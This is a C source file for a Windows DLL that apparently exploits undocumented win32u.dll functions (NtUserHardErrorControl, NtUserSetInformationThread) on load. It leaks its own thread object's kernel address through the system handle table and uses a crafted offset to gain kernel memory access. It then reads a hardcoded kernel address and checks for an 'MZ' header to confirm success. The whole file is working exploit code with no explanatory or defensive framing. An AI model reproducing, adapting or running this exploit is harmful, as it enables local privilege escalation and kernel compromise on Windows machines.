#include <windows.h>

typedef struct
{
	USHORT	UniqueProcessId;
	USHORT	CreatorBackTraceIndex;
	UCHAR	ObjectTypeIndex;
	UCHAR	HandleAttributes;
	USHORT	HandleValue;
	PVOID	Object;
	ULONG	GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct
{
	ULONG	NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct
{
	PVOID	Param1;
	PVOID	Param2;
	PVOID	Param3;
} NT_USER_SET_INFORMATION_THREAD;

typedef struct
{
	PVOID	Param1;
	PVOID	Param2;
} NT_USER_HARD_ERROR_CTRL;

typedef
NTSTATUS
( NTAPI * NtUserHardErrorControl_T ) (
	_In_ INT Command,
	_In_ LPVOID Handle,
	_In_ LPVOID Info
);

typedef
NTSTATUS
( NTAPI * NtUserSetInformationThread_T )( 
	_In_ HANDLE Thread,
	_In_ INT Command,
	_In_ PVOID ThreadInformation,
	_In_ ULONG Length
);

BOOL WINAPI DllMain( _In_ HINSTANCE Instance, _In_ DWORD Reason, _In_ LPVOID Parameter ) {

	HANDLE                       	ModuleHandlePointer = NULL;
	NT_USER_HARD_ERROR_CTRL	     	CallInfo;
	NT_USER_SET_INFORMATION_THREAD	CallTwos;
	ULONG				Size = 0;
	HANDLE				Thread = NULL;
	PSYSTEM_HANDLE_INFORMATION	Info = NULL;
	NtUserHardErrorControl_T 	NtUserHardErrorControl = NULL;
	NtUserSetInformationThread_T	NtUserSetInformationThread = NULL;

	RtlSecureZeroMemory( &CallInfo, sizeof( CallInfo ) );
	RtlSecureZeroMemory( &CallTwos, sizeof( CallTwos ) );

	switch( Reason ) {
		case DLL_PROCESS_ATTACH:
			ModuleHandlePointer = GetModuleHandleA("win32u.dll");

			if ( ModuleHandlePointer != NULL ) {
				NtUserHardErrorControl     = GetProcAddress( ModuleHandlePointer, "NtUserHardErrorControl" );
				NtUserSetInformationThread = GetProcAddress( ModuleHandlePointer, "NtUserSetInformationThread" );

				if ( NtUserHardErrorControl != NULL && NtUserSetInformationThread != NULL ) {
					if ( ( Thread = OpenThread( THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId()) ) ) {
						if ( ( Info = LocalAlloc( LPTR, 1024 * 1024 * 2 ) ) ) {
							if ( ! NtQuerySystemInformation( 0x10, Info, 1024 * 1024 * 2, &Size ) ) {
								for ( INT i = 0 ; i < Info->NumberOfHandles ; ++i ) {
									if ( Info->Handles[i].UniqueProcessId == GetCurrentProcessId() ) {
										if ( Info->Handles[i].HandleValue == ( USHORT ) Thread ) {
											NtUserSetInformationThread(
													( ( HANDLE ) - 2 ),
													7,
													&CallTwos,
													sizeof( CallTwos )
											);
											CallInfo.Param1 = ( PVOID )( 
													( ULONG_PTR )( Info->Handles[i].Object ) +
													( ULONG_PTR )( 0x232 ) +
													( ULONG_PTR )( 0x30 )
											);
											CallInfo.Param2 = CallTwos.Param3;
											NtUserHardErrorControl(
													6,
													( ( HANDLE ) - 2 ),
													&CallInfo
											);
										
											UCHAR Bf[2];
											SIZE_T Ln = 2;
											if ( ! NtReadVirtualMemory(
													( ( HANDLE ) - 1 ),
													0xfffff80372400000,
													&Bf,
													2,
													&Ln
											) ) {
												if ( Bf[0] == 'M' && Bf[1] == 'Z' ) {
													OutputDebugStringA("success. read dos header");
												};
											};
										};
									};
								};
							};
							LocalFree( Info );
						};
						CloseHandle( Thread );
					};
					//NtUserSetInformationThread( ( ( HANDLE ) - 2 ), 7, &CallTwos , sizeof( CallTwos ) );
					//CallInfo.Param1 = ( PVOID )( ( ULONG_PTR )( ( ULONG_PTR )( 0xfffff8003d210000 ) + 0x30 ) );
					//CallInfo.Param2 = CallTwos.Param3;
					//NtUserHardErrorControl( 6, ( ( HANDLE ) - 2 ), &CallInfo );
				};
			};
			break;
	};
	return FALSE;
};
